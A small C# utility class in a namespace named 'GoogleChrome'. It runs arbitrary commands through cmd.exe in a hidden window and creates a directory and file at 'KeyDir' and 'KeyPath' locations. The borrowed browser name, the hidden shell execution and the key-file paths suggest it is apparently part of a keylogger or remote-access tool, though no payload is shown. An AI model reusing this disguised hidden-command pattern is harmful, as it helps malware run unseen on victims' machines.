using System;
using System.Diagnostics;
using System.IO;

namespace GoogleChrome
{
    public class Utils
    {
        public static void Execute(string command)
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine(command);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
        }

        

        public static string ExecuteWithResult(string command)
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine(command);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            return cmd.StandardOutput.ReadToEnd();
        }


        public static void FileHanler()
        {
            if (!Directory.Exists(Setting.KeyDir))
            {
                Directory.CreateDirectory(Setting.KeyDir);
            }
            if (!File.Exists(Setting.KeyPath))
            {
                File.Create(Setting.KeyPath);
            }
        }
    }
}
